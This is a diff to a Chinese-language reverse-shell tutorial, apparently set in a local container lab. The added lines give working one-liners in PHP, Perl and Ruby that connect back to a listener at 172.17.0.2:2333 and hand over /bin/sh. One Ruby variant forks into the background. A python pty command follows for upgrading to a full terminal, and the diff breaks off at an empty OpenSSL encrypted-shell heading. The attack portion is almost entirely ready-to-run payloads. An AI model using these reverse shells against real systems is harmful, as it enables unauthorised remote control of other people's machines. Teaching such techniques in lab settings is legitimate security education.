@@ -81,3 +81,32 @@ whoami
 ifconfig
 ```
 为反弹shell后输入的命令，可以看到ip显示的是目标机的172.17.0.3。
+
+#### 同理，php/perl/ruby 等脚本都可以反弹shell
+#### 命令分别为：
+```shell
+php -r '$sock=fsockopen("172.17.0.2",2333);exec("/bin/sh -i <&3 >&3 2>&3");'
+```
+```shell
+perl -e 'use Socket;$i="172.17.0.2";$p=2333;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+```
+```shell
+ruby -rsocket -e 'c=TCPSocket.new("172.17.0.2","2333");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
+或
+ruby -rsocket -e 'exit if fork;c=TCPSocket.new("172.17.0.2","2333");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
+```
+
+### 4. 获取完整终端
+
+之前几个demo演示中，反弹得到的bash或者sh都是不完整的终端，即使获取了控制权限，但是由于显示不完整，不能通过passwd修改密码等。
+所以可以通过python的pty标准库来获取一个完整的虚拟终端。
+
+```shell
+python3 -c "import pty;pty.spawn('/bin/bash')"
+```
+通过该命令即可模拟一个终端设备。
+![](get_complete_console.png)
+可以看到，终端id和目标机的也一样，ip等其他的也一样。
+
+### 5. 通过OpenSSL反弹加密shell
+
